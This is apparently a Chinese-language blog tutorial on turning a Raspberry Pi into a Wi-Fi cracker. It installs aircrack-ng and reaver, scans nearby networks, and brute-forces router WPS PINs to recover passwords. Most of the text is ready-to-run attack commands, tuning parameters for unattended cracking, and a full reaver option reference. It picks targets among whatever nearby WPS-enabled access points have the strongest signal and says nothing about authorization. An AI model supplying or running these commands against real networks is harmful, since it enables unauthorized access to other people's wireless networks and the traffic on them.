#硬件环境
树莓派B+一个（我用的是debian环境）
PC一台（或其它设备直接操作PI就行）
无线网卡（能用就行，不过强大的无线网卡会事半功倍，我用的3070）
>Find注：
>>无线网卡不是哪个都行，需要支持监听模式才可以，支持列表可以查看这里： https://wikidevi.com/wiki/Wireless_adapters/Chipset_table
#安装依赖包
```
sudo apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion ethtool
sudo apt-get install -y libnl-3-200 libnl-3-dev libnl-genl-3-dev libnl-genl-3-200
```
#安装aircarck-ng

```
svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng
cd aircrack-ng/
make
sudo make install
还提示了Run 'airodump-ng-oui-update' as root (or with sudo) to install or update Airodump-ng OUI file (Internet connection required).
sudo airodump-ng-oui-update
```
#安装reaver
```
wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz
tar zxvf reaver-1.4.tar.gz
cd reaver-1.4/src
./configure
make
sudo make install
```
以上两个资源包都可以在这里找到：
[百度网盘分享][1]

如果安装成功后，会有`airmon-ng`,`airodump-ng`,`reaver`等命令可用。

#破解教程
`
sudo airmon-ng start wlan0
sudo airodump-ng mon0
`
![][2]

根据上面的airodump搜索到的无线信号，然后可以挑信号强的进行破解（注意，要选择开了WPS功能的）
注意看这张列表，列表中显示了你周边无线的相关信息。注意看 MB 这一列，显示为" 54 "、"54e. "等等，这表示了无线当前的速率模式以及WPS开启状况，我自己的路由器是 "steve"，注意看，”54e“和” 54e. “是不同的，多了一个 点，这个点表示开启了 wps模式。所以我们下面就进行wps的探测，在这里我们要记住SSID对应的MAC地址，此后我们会针对MAC地址进行攻击和探测。
![][3]
```
sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11
```
-vv 是查看详细信息的，等你熟练了之后，你就可以使用 -v ，这样就简单了。通常，遇到问题才会使用 -vv 。
如果想挂机破解，记得加上nohup命令后，可以断开ssh。然后剩下就是等待。
```
nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi &
```
`-o`参数是输出到文件
如果破解成功后，打开输出的日志，就可以看到reaver出来的密码。
![][4]
#命令说明：
##reaver
###使用方法：
airmon-ng start wlan0 //启动mon0监控
reaver -i mon0 -b MAC -a -S -vv //普通用法

###如果，90.9%进程后死机或停机，请记下PIN前四位数，用指令：
reaver -i mon0 -b MAC -a -vv -p XXXX(PIN前四位数)

###其他命令
airodump-ng mon0 用来扫描周围无线信号
wash -i mon0 -C 这个是用来检测周围无线支持PIN的路由

###如果一直pin不动，尝试加-N参数
reaver -i mon0 -b xx:xx:xx:xx:xx:xx -d 0 -vv -a -S -N
也可以加延时 -t 3 -b 3

###常用参数释疑
-i 监听后接口名称 网卡的监视接口，通常是mon0
-b 目标mac地址 AP的MAC地址
-a 自动检测目标AP最佳配置
-S 使用最小的DH key，可以提高PJ速度
-vv 显示更多的非严重警告
-d 即delay每穷举一次的闲置时间 预设为1秒
reaver -i mon0 -b MAC -d 0
用上述指令可以大幅加快PJ速度 但是有些AP可能受不了
-c （后跟频道数） 指定频道,可以方便找到信号
-p PIN码四位或八位 //已知pin码前4位可以带此参数，指定从这个数字开始pin。可以用8位直接找到密码。
-N 不发送NACK信息（如果一直pin不动，可以尝试这个参数）
-n 对目标AP总是发送NACK，默认自动
-t 即timeout每次穷举等待反馈的最长时间，如果信号不错，可以这样###设置
reaver -i mon0 -b MAC -d 0 -t .5
-m, --mac=<mac> 指定本机MAC地址，在AP有MAC过滤的时候需要使用

###小结-PJ时应因状况调整参数:
信号非常好:
reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1
信号普通:
reaver -i mon0 -b MAC -a -S -vv -d .5 -t .5 -c 1
信号一般:
reaver -i mon0 -b MAC -a -S -vv -c 1

当出现有百分数时你就可以用crtl+c来暂停，它会将reaver的进度表文件保存在
1.3版：
/etc/reaver/MAC地址.wpc
1.4版：
/usr/local/etc/reaver/MAC地址.wpc
用资源管理器，手工将以MAC地址命名的、后辍为wpc的文件拷贝到U盘或硬盘中，
下次重启动后，再手工复制到/etc/reaver/ 目录下即可。






不是所有的路由都支持pin学习。AP关闭了WPS、或者没有QSS滴，会出现
WARNING: Failed to associate with XX:XX:XX:XX:XX:XX (ESSID: XXXX)
学习过程中也可随时随地按Ctrl+C终止PJ，重复同一个PIN码 或 timeou t可终止，reaver会自动保存进度。
继续上次的PJ，则再次在终端中发送:
reaver -i mon0 -b MAC -vv
这条指令下达后，会让你选y或n，选y后就继续了
当reaver确定前4位PIN密码后，其工作完成任务进度数值将直接跳跃至90.9%以上，也就是说只剩余一千个密码组合了（总共一万一千个密码）。





参数详细说明:
-m, --mac=<mac> MAC of the host system
指定本机MAC地址，在AP有MAC过滤的时候需要使用
-e, --essid=<ssid> ESSID of the target AP
路由器的ESSID，一般不用指定
-c, --channel=<channel> Set the 802.11 channel for the interface (implies -f)
信号的频道，如果不指定会自动扫描
-o, --out-file=<file> Send output to a log file [stdout]
标准输出到文件
-s, --session=<file> Restore a previous session file
恢复进程文件
-C, --exec=<command> Execute the supplied command upon successful pin recovery
pin成功后执行命令
-D, --daemonize Daemonize reaver
设置reaver成Daemon
-a, --auto Auto detect the best advanced options for the target AP
对目标AP自动检测高级参数
-f, --fixed Disable channel hopping
禁止频道跳转
-5, --5ghz Use 5GHz 802.11 channels
使用5G频道
-v, --verbose Display non-critical warnings (-vv for more)
显示不重要警告信息 -vv 可以显示更多
-q, --quiet Only display critical messages
只显示关键信息
-h, --help Show help
显示帮助

-vv 显示更多的非严重警告

高级参数:
-p, --pin=<wps pin> Use the specified 4 or 8 digit WPS pin
直接读取psk（本人测试未成功，建议用网卡自带软件获取）
-d, --delay=<seconds> Set the delay between pin attempts [1]
pin间延时，默认1秒，推荐设0
-l, --lock-delay=<seconds> Set the time to wait if the AP locks WPS pin attempts [60]
AP锁定WPS后等待时间
-g, --max-attempts=<num> Quit after num pin attempts
最大pin次数
-x, --fail-wait=<seconds> Set the time to sleep after 10 unexpected failures [0]
10次意外失败后等待时间，默认0秒
-r, --recurring-delay=<x:y> Sleep for y seconds every x pin attempts
每x次pin后等待y秒
-t, --timeout=<seconds> Set the receive timeout period [5]
收包超时，默认5秒
-T, --m57-timeout=<seconds> Set the M5/M7 timeout period [0.20]
M5/M7超时，默认0.2秒
-A, --no-associate Do not associate with the AP (association must be done by another application)
不连入AP（连入过程必须有其他程序完成）
-N, --no-nacks Do not send NACK messages when out of order packets are received
不发送NACK信息（如果一直pin不动，可以尝试这个参数）
-S, --dh-small Use small DH keys to improve crack speed
使用小DH关键值提高速度（推荐使用）
-L, --ignore-locks Ignore locked state reported by the target AP
忽略目标AP报告的锁定状态
-E, --eap-terminate Terminate each WPS session with an EAP FAIL packet
每当收到EAP失败包就终止WPS进程
-n, --nack Target AP always sends a NACK [Auto]
对目标AP总是发送NACK，默认自动
-w, --win7 Mimic a Windows 7 registrar [False]
模拟win7注册，默认关闭


#Reference
http://lok.me/a/1972.html
http://bao3.blogspot.com/2013/05/raspberry-pi.html
http://tieba.baidu.com/p/2682878857
http://www.nyaboron.moe/posts/606.html

[1]: http://pan.baidu.com/s/1eQ6HG6Q "百度网盘树莓派"
[2]: http://www.findspace.name/wp-content/uploads/2015/11/raspberry1.png "sudo airodump-ng mon0"
[3]: http://www.findspace.name/wp-content/uploads/2015/11/raspberry2.png ""
[4]: http://www.findspace.name/wp-content/uploads/2015/11/raspberry3.png ""
